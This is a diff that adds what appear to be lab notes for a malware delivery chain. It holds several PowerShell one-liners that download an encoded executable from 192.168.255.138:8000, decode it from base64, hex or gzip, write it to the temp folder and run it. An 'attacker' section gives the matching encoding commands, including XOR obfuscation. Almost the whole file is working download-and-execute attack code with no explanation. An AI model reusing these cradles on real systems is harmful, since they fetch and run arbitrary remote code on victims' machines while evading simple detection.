@@ -1,0 +1,60 @@
+#base64
+$payload = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString("http://192.168.255.138:8000/openPopup.b64"))
+[IO.File]::WriteAllBytes("$env:TEMP\openPopup.exe", $payload); invoke-item $env:TEMP\openPopup.exe
+
+
+#base64
+$payload = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString("http://192.168.255.138:8000/payload.b64"))
+[IO.File]::WriteAllBytes("$env:TEMP\openPopup.exe", $payload)
+& "$env:TEMP\openPopup.exe"
+
+
+#hex
+$hex = (New-Object Net.WebClient).DownloadString("http://192.168.255.138:8000/payload.hex")
+$bytes = [byte[]]@($hex -split '(..)' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
+[IO.File]::WriteAllBytes("$env:TEMP\openPopup.exe", $bytes)
+& "$env:TEMP\openPopup.exe"
+
+
+
+#b64 + gzip //errors but works
+
+$payload = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString("http://192.168.255.138:8000/payload.gz.b64"))
+$stream = New-Object IO.MemoryStream(, $payload)
+$gzip = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress)
+$reader = New-Object IO.StreamReader($gzip)
+$decoded = [Convert]::FromBase64String($reader.ReadToEnd())
+[IO.File]::WriteAllBytes("$env:TEMP\openPopup.exe", $decoded)
+& "$env:TEMP\openPopup.exe"
+
+
+
+
+
+
+
+
+
+
+
+
+
+%attacker
+$Attacker
+# Base64
+base64 -w 0 openPopup.exe > payload.b64
+
+# Hex
+xxd -p openPopup.exe > payload.hex
+
+# XOR (simple key)
+python3 << 'EOF'
+key = 0xAB
+with open("openPopup.exe", "rb") as f:
+    data = f.read()
+with open("payload.xor", "wb") as f:
+    f.write(bytes([b ^ key for b in data]))
+EOF
+
+# Gzip
+gzip -c openPopup.exe | base64 -w 0 > payload.gz.b64
